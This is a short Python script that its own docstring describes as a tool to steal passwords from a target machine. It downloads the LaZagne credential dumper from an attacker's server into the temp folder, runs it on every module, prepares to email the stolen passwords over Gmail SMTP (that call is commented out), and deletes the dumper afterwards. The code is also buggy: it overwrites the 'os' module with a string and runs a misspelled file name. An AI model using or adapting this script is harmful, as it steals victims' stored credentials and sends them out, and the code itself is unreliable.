"""
Refer to https://github.com/AlessandroZ/LaZagne for module that runs on target machine to steal passwords
"""
#!/usr/bin/env python
import requests, subprocess, smtplib, os, tempfile


#======================================
#Download file from a url
#======================================
def download(url):
    get_response = requests.get(url)
    file_name = url.split('/')[-1]
    with open(file_name, 'wb') as out_file:
        out_file.write(get_response.content)

#======================================
#
#======================================
def send_mail(email, psswd, message):
    server = smtplib.SMTP("smtp.gmail.com", 587) #(smtp_server, port)
    server.starttls()
    server.login(email, psswd)
    server.sendmail(email, email, message) #(from, to, email_content)
    server.quit()

temp_directory = tempfile.gettempdir() #returns the temp directory

os.chdir(temp_directory)


server_ip = ''
os = ''
download(f'http://{server_ip}/black-files/LaZagne/{os}/laZagne.py')

captured_passwords = subprocess.check_output('python laZagbe.py all', shell=True)

#send_mail(email, password, captured_passwords)

os.remove('laZagne.py') #deletes file after execution

